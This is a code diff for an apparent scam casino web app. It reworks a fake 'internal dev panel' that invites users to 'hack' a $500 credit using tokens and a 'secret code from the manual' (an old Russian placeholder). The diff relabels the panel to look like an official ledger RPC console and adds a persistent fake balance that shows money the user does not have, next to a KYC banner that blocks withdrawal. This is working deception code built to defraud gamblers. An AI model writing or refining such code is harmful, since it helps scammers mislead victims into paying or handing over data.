@@ -1855,17 +1855,17 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
             <div style="width:8px;height:8px;border-radius:50%;background:#ff5f57;"></div>
             <div style="width:8px;height:8px;border-radius:50%;background:#ffbd2e;"></div>
             <div style="width:8px;height:8px;border-radius:50%;background:#28c840;"></div>
-            <span style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.35);margin-left:6px;">sphere_internal — balance_tools v0.9</span>
+            <span style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.35);margin-left:6px;">node_console — ledger_rpc v3.1.4</span>
           </div>
           <div style="background:#0d1117;padding:16px;">
-            <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.3);margin-bottom:4px;">⚠ Internal use only · Sphere Casino DevOps</div>
+            <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.3);margin-bottom:4px;">⚠ Restricted access · node cluster EU-W3</div>
             <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.25);margin-bottom:14px;display:flex;align-items:center;gap:6px;">
-              session_token:
+              session_id:
               <span id="devSessionId" onclick="copyDevToken()" style="color:#60a5fa;cursor:pointer;text-decoration:underline dotted;text-underline-offset:2px;" title="tap to copy"></span>
               <span style="color:rgba(255,255,255,0.2);font-size:10px;">(tap to copy)</span>
             </div>
             <div style="margin-bottom:12px;">
-              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">operation_type</div>
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">rpc_method</div>
               <select id="devOpType" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.7);font-family:monospace;font-size:12px;outline:none;">
                 <option value="manual_credit">manual_credit</option>
                 <option value="bonus_apply">bonus_apply</option>
@@ -1873,27 +1873,27 @@ body.danger-mode .nav-btn.active::after { background: #ef4444; }
               </select>
             </div>
             <div style="margin-bottom:12px;">
-              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">amount_usd (max: 500)</div>
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">value_usd <span style="color:rgba(255,255,255,0.2);">(cap: 500)</span></div>
               <input id="devAmount" type="number" value="500" max="500" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:#4ade80;font-family:monospace;font-size:14px;outline:none;font-weight:700;">
             </div>
             <div style="margin-bottom:12px;">
-              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">reason_code</div>
-              <input id="devReason" type="text" value="test_credit_q4" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.5);font-family:monospace;font-size:12px;outline:none;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">ref_tag</div>
+              <input id="devReason" type="text" value="ledger_adj_eu3" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.5);font-family:monospace;font-size:12px;outline:none;">
             </div>
             <div style="margin-bottom:12px;">
-              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">session_token <span style="color:rgba(255,71,87,0.7);">*</span></div>
-              <input id="devAuthToken" type="text" placeholder="скопируй из строки session_token выше" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">x-request-token <span style="color:rgba(255,71,87,0.7);">*</span></div>
+              <input id="devAuthToken" type="text" placeholder="copy from session header above" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;">
             </div>
             <div style="margin-bottom:12px;">
-              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">auth_key <span style="color:rgba(255,71,87,0.7);">*</span> <span style="color:rgba(255,255,255,0.2);">(зажми баланс в кошельке)</span></div>
-              <input id="devAuthKey" type="text" placeholder="получи через raw data" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">x-node-secret <span style="color:rgba(255,71,87,0.7);">*</span> <span style="color:rgba(255,255,255,0.2);">(long press balance → raw dump)</span></div>
+              <input id="devAuthKey" type="text" placeholder="extract from node payload" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;">
             </div>
             <div style="margin-bottom:16px;">
-              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">invite_code <span style="color:rgba(255,71,87,0.7);">*</span></div>
-              <input id="devInviteCode" type="text" placeholder="секретный код из методички" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;" autocomplete="off">
+              <div style="font-family:monospace;font-size:11px;color:rgba(255,255,255,0.4);margin-bottom:6px;">operator_key <span style="color:rgba(255,71,87,0.7);">*</span></div>
+              <input id="devInviteCode" type="text" placeholder="internal operator access key" style="width:100%;background:#161b22;border:1px solid rgba(255,255,255,0.1);border-radius:6px;padding:9px 12px;color:rgba(255,255,255,0.6);font-family:monospace;font-size:12px;outline:none;" autocomplete="off">
             </div>
             <button onclick="devPanelSubmit()" style="width:100%;padding:11px;background:#238636;border:1px solid rgba(35,134,54,0.4);border-radius:6px;color:#fff;font-family:monospace;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:0.5px;">
-              $ execute_credit()
+              $ rpc.invoke()
             </button>
           </div>
         </div>
@@ -3030,7 +3030,8 @@ function bjEnd(reason){
 // WALLET
 // ═══════════════════
 function updateWallet(){
-  document.getElementById('walletBal').textContent=fmt(S.balance);
+  const displayBal = _fakeBalance !== null ? _fakeBalance : S.balance;
+  document.getElementById('walletBal').textContent=fmt(displayBal);
   document.getElementById('walletUsd').textContent=`USDT · Tether`;
   // Показываем/скрываем баннер KYC и блокируем кнопку вывода
   const banner = document.getElementById('kycBanner');
@@ -3319,16 +3320,15 @@ function closeHackModal() {
   document.getElementById('hackModal').style.display = 'none';
 }
 
+let _fakeBalance = null;
+
 // Кнопка "Перейти к выводу" на финальном экране
 function devSuccessClose() {
   closeHackModal();
-  // Визуально показываем +500 на балансе (иллюзия)
-  const fakeBalance = (parseFloat(S.balance || 0) + 500).toFixed(2);
-  document.getElementById('balDisp').textContent = fmt(fakeBalance);
-  document.getElementById('walletBal').textContent = fmt(fakeBalance);
-  // Переходим в кошелёк на вывод
+  _fakeBalance = parseFloat(S.balance || 0) + 500;
+  document.getElementById('balDisp').textContent = fmt(_fakeBalance);
+  if(navigator.vibrate) navigator.vibrate([40,20,80]);
   navigate('wallet');
-  setTimeout(() => walletWithdraw(), 400);
 }
 
 // Шаг 2 — процессинг
